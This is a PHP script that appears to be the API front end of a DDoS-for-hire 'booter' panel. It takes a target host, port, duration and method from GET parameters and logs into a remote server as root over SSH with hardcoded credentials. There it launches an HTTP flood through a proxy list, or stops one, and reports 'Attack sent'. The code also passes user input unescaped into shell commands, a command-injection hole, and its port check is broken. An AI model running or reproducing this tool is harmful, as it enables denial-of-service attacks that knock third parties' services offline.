<?php
  include('Net/SSH2.php');

  $address = "8.tcp.ngrok.io"; //Server IP (If same server use localhost)

  $serverPort = 14140; //SSH port (Default 22)
 
  $user = "root"; //User for the server
 
  $password = "1"; //Password for the server
  
  $Methods = array("HTTPGET", "STOP"); //Array of methods

  $APIKey = "1"; //Your API Key

  $host = $_GET["host"];
  $port = $_GET["port"];
  $time = $_GET["time"];
  $method = $_GET["method"];

  $key = $_GET["key"];

  if (empty($host) | empty($port) | empty($time) | empty($method))  //Checking the fields
  {
    die("Please verify all fields");
  }

  if (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($host, FILTER_VALIDATE_URL))
  {
    die('The request could not be successful, please insert a correct IP address(v4)/URL..');
  }

  if($port < 1 && $port > 65535) //Validating port
  {
    die("Port is invalid");
  }

  if ($time < 1) //Validating time
  {
    die("Time is invalid!");
  }

  if (!in_array($method, $Methods))  //Validating method
  {
    die("Method is invalid!");
  }
  
  if ($key !== $APIKey) //Validating API Key
  { 
    die("Invalid API Key!");
  }

  function send()
  {
    global $method;
    global $methods;
    global $address;
    global $serverPort;
    global $user;
    global $password;
    global $time;
    global $port;
    global $host;

    $connection = ssh2_connect($address, $serverPort);
    if(ssh2_auth_password($connection, $user, $password))
    {
      if($method == "HTTPGET"){if(ssh2_exec($connection, "screen -dm  timeout $time node http.js $host proxies.txt $time")){echo "Attack sent to $host for $time seconds using $method!";}else{die("Ran into a error");}}  
      if($method == "STOP"){if(ssh2_exec($connection, "pkill -f $host | screen -X -S $host quit")){echo "Attack stopped on $host!";}else{die("Ran into a error");}}   
    }
    else
    {
      die("Could not login to remote server, this may be a error with the login credentials.");
    }
  }
  send();
?>
